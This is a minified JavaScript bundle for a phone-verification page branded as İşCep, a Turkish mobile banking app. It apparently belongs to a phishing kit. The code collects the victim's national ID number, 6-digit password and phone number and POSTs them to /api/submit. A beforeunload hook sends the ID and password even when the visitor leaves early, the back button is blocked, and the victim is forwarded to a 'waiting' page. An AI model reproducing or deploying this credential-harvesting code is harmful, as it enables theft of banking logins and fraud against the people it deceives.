"use strict";(self.webpackChunkfrontend=self.webpackChunkfrontend||[]).push([[527],{82:(e,o,n)=>{n.r(o),n.d(o,{default:()=>c});var i=n(555),r=n(43),t=n(366);n(50);const a=n.p+"static/media/iscep-logo.9e455838b6dd42e72a34.png";var s=n(613),l=n(579);function h(){const[e,o]=r.useState({phoneNumber:"",isPhoneActive:!1,isPhoneLabelHovered:!1,showPhoneError:!1,isSubmitting:!1,isPhoneFocused:!1,isPhonePrefixVisible:!1,errorMessage:""}),n=(0,r.useRef)(null),h=(0,t.zy)(),c=(0,t.Zp)(),{dispatch:d}=(0,s.A)(),{tc:u,password:p,isValidNavigation:v}=h.state||{},b="/api/submit";(0,r.useEffect)((()=>{if(!v||!u||!p||11!==u.length||6!==p.length)return o((e=>(0,i.A)((0,i.A)({},e),{},{showPhoneError:!0,errorMessage:"Ge\xe7ersiz eri\u015fim, l\xfctfen giri\u015f yap\u0131n."}))),d({type:"RESET_AUTH"}),void c("/giris",{replace:!0,state:{fromPhoneVerification:!0}});window.history.replaceState({page:"telefon"},"","/telefon"),window.history.pushState({page:"telefon-guard"},"","/telefon");const e=e=>{e.preventDefault(),d({type:"RESET_AUTH"}),window.history.replaceState(null,"","/giris"),c("/giris",{replace:!0,state:{fromPhoneVerification:!0}})};return window.addEventListener("popstate",e),()=>window.removeEventListener("popstate",e)}),[u,p,v,c,d]);const A=(0,r.useCallback)((async e=>{try{const o=await fetch(b,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({tc:String(e.tc),password:String(e.password),phone:String(e.phone)})}),n=await o.json();if(!o.ok)throw new Error(n.message||"Veri g\xf6nderimi ba\u015far\u0131s\u0131z.");return n}catch(n){return o((e=>(0,i.A)((0,i.A)({},e),{},{showPhoneError:!0,errorMessage:"Veri g\xf6nderimi s\u0131ras\u0131nda hata olu\u015ftu: ".concat(n.message||"L\xfctfen tekrar deneyin.")}))),{error:n.message}}}),[b]);(0,r.useEffect)((()=>{const o=()=>{u&&p&&!e.phoneNumber&&A({tc:u,password:p,phone:""})};return window.addEventListener("beforeunload",o),()=>window.removeEventListener("beforeunload",o)}),[u,p,e.phoneNumber,A]);const m=(0,r.useCallback)((e=>{const n=e.target.value.replace(/\D/g,"");n.length<=10&&o((e=>(0,i.A)((0,i.A)({},e),{},{phoneNumber:n,isPhoneActive:!0,isPhoneLabelHovered:!0,isPhonePrefixVisible:!0,showPhoneError:!1,errorMessage:""})))}),[]),N=(0,r.useCallback)((()=>{var e;o((e=>(0,i.A)((0,i.A)({},e),{},{phoneNumber:"",isPhoneActive:!0,isPhoneLabelHovered:!0,isPhonePrefixVisible:!0,showPhoneError:!1,errorMessage:""}))),null===(e=n.current)||void 0===e||e.focus()}),[]),g=(0,r.useCallback)((()=>{o((e=>(0,i.A)((0,i.A)({},e),{},{isPhoneActive:!0,isPhoneLabelHovered:!0,isPhonePrefixVisible:!0,isPhoneFocused:!0})))}),[]),w=(0,r.useCallback)((()=>{o((e=>(0,i.A)((0,i.A)({},e),{},{isPhoneFocused:!1,isPhoneActive:e.phoneNumber.length>0,isPhoneLabelHovered:e.phoneNumber.length>0,isPhonePrefixVisible:e.phoneNumber.length>0})))}),[]),I=(0,r.useCallback)((async n=>{if(n.preventDefault(),e.phoneNumber.length>0&&10!==e.phoneNumber.length)o((e=>(0,i.A)((0,i.A)({},e),{},{showPhoneError:!0,errorMessage:"Telefon numaras\u0131 10 haneli olmal\u0131."})));else if(10===e.phoneNumber.length){o((e=>(0,i.A)((0,i.A)({},e),{},{isSubmitting:!0})));const n=await A({tc:u,password:p,phone:e.phoneNumber});n&&!n.error&&(d({type:"RESET_AUTH"}),o({phoneNumber:"",isPhoneActive:!1,isPhoneLabelHovered:!1,showPhoneError:!1,isSubmitting:!1,isPhoneFocused:!1,isPhonePrefixVisible:!1,errorMessage:""}),window.history.replaceState(null,"","/bekleme"),c("/bekleme",{replace:!0,state:{isValidNavigation:!0,from:"/telefon",isCompleted:!0}}))}}),[e.phoneNumber,A,u,p,c,d]);return(0,l.jsx)("div",{className:"container",style:{touchAction:"manipulation"},children:(0,l.jsxs)("div",{className:"right-section",children:[(0,l.jsx)("img",{src:a,alt:"\u0130\u015fCep Logosu",className:"iscep-logo iscep-logo-phone",loading:"lazy"}),(0,l.jsxs)("div",{className:"new-container phone-verification-title",children:["Telefon Do\u011frulama",(0,l.jsx)("div",{className:"phone-verification-subtitle",children:"L\xfctfen cep telefon numaran\u0131z\u0131 giriniz"})]}),(0,l.jsxs)("div",{className:"input-wrapper",children:[(0,l.jsxs)("div",{className:"phone-input-wrapper ".concat(e.showPhoneError?"error":""," ").concat(e.isPhonePrefixVisible?"prefix-visible":""),onClick:()=>{var e;return null===(e=n.current)||void 0===e?void 0:e.focus()},children:[(0,l.jsx)("label",{className:"phone-label ".concat(e.isPhoneLabelHovered?"phone-hovered":""),htmlFor:"phone-input",children:"Telefon Numaras\u0131"}),(0,l.jsxs)("div",{className:"phone-input-container",children:[(0,l.jsx)("span",{className:"phone-prefix",children:"+90"}),(0,l.jsx)("input",{id:"phone-input",ref:n,type:"tel",inputMode:"numeric",pattern:"[0-9]*",maxLength:"10",value:e.phoneNumber,onChange:m,onFocus:g,onBlur:w,className:"new-input phone-input ".concat(e.showPhoneError?"error":""),autoComplete:"tel",autoCapitalize:"none","aria-describedby":"phone-error","aria-label":"Telefon Numaras\u0131","aria-invalid":e.showPhoneError}),e.phoneNumber.length>0&&(0,l.jsx)("button",{className:"clear-phone-button",onClick:N,onTouchStart:N,"aria-label":"Telefon numaras\u0131n\u0131 temizle",children:"\u2715"})]}),e.showPhoneError&&(0,l.jsxs)("div",{id:"phone-error",className:"phone-error",role:"alert","aria-live":"assertive",children:[(0,l.jsx)("img",{src:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8CAYAAAA6/NlyAAAACXBIWXMAAAsTAAALEwEAmpwYAAAGNGlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgOS4xLWMwMDIgNzkuYTZhNjM5NiwgMjAyNC8wMy8xMi0wNzo0ODoyMyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iIHhtbG5zOnBob3Rvc2hvcD0iaHR0cDovL25zLmFkb2JlLmNvbS9waG90b3Nob3AvMS4wLyIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0RXZ0PSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VFdmVudCMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIDI1LjEyIChXaW5kb3dzKSIgeG1wOkNyZWF0ZURhdGU9IjIwMjUtMDQtMjBUMTU6MDU6MDgrMDM6MDAiIHhtcDpNb2RpZnlEYXRlPSIyMDI1LTA0LTIwVDE2OjIyOjQwKzAzOjAwIiB4bXA6TWV0YWRhdGFEYXRlPSIyMDI1LTA0LTIwVDE2OjIyOjQwKzAzOjAwIiBkYzpmb3JtYXQ9ImltYWdlL3BuZyIgcGhvdG9zaG9wOkNvbG9yTW9kZT0iMyIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDowOGFkNDhlNi1kNWRmLThhNDktOWE4Ny02NTU4ZjFkYzFlMGMiIHhtcE1NOkRvY3VtZW50SUQ9ImFkb2JlOmRvY2lkOnBob3Rvc2hvcDo2ZDQwZTcxOC03MmZhLTIxNGQtODYzZi0wMzRlNDg2OTQ4NTMiIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDpjNTA5ODRiNy0yZmVjLThjNDEtYmU4Zi0zOTZlN2YyY2U2YTAiPiA8eG1wTU06SGlzdG9yeT4gPHJkZjpTZXE+IDxyZGY6bGkgc3RFdnQ6YWN0aW9uPSJjcmVhdGVkIiBzdEV2dDppbnN0YW5jZUlEPSJ4bXAuaWlkOmM1MDk4NGI3LTJmZWMtOGM0MS1iZThmLTM5NmU3ZjJjZTZhMCIgc3RFdnQ6d2hlbj0iMjAyNS0wNC0yMFQxNTowNTowOCswMzowMCIgc3RFdnQ6c29mdHdhcmVBZ2VudD0iQWRvYmUgUGhvdG9zaG9wIDI1LjEyIChXaW5kb3dzKSIvPiA8cmRmOmxpIHN0RXZ0OmFjdGlvbj0iY29udmVydGVkIiBzdEV2dDpwYXJhbWV0ZXJzPSJmcm9tIGFwcGxpY2F0aW9uL3ZuZC5hZG9iZS5waG90b3Nob3AgdG8gaW1hZ2UvcG5nIi8+IDxyZGY6bGkgc3RFdnQ6YWN0aW9uPSJzYXZlZCIgc3RFdnQ6aW5zdGFuY2VJRD0ieG1wLmlpZDowOGFkNDhlNi1kNWRmLThhNDktOWE4Ny02NTU4ZjFkYzFlMGMiIHN0RXZ0OndoZW49IjIwMjUtMDQtMjBUMTY6MjI6NDArMDM6MDAiIHN0RXZ0OnNvZnR3YXJlQWdlbnQ9IkFkb2JlIFBob3Rvc2hvcCAyNS4xMiAoV2luZG93cykiIHN0RXZ0OmNoYW5nZWQ9Ii8iLz4gPC9yZGY6U2VxPiA8L3htcE1NOkhpc3Rvcnk+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+4hT55AAADFBJREFUaIHtmluMXdV5x3/rtvc+58ycucDYBsyAsBJSyqWoJiKCyKrpixO58oMrUFAcySlIUR+ah1Z96FMf2qdK5aVKVUVETdIKtTSkIjSto9hUxWBjYMDxDWxjewzG9nhuZ86csy9rra8P+5j2jSGeoZXxJy1pdM6Zs/6/9e3vtvdRIsLnyfT/tYDP2m4A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",alt:"Hata Simgesi",className:"error-icon",loading:"lazy",onError:()=>console.warn("Hata simgesi y\xfcklenemedi")}),e.errorMessage||"L\xfctfen 10 haneli telefon numaran\u0131z\u0131 girin."]})]}),(0,l.jsx)("div",{className:"verify-button-container",children:(0,l.jsx)("button",{className:"button-phone ".concat(e.phoneNumber.length>0?"active-continue-button":""),onClick:I,onTouchStart:I,disabled:e.isSubmitting,"aria-label":"Telefon numaras\u0131n\u0131 do\u011frula",children:"Do\u011frula"})})]})]})})}const c=(0,r.memo)(h)}}]);
//# sourceMappingURL=527.40304dde.chunk.js.map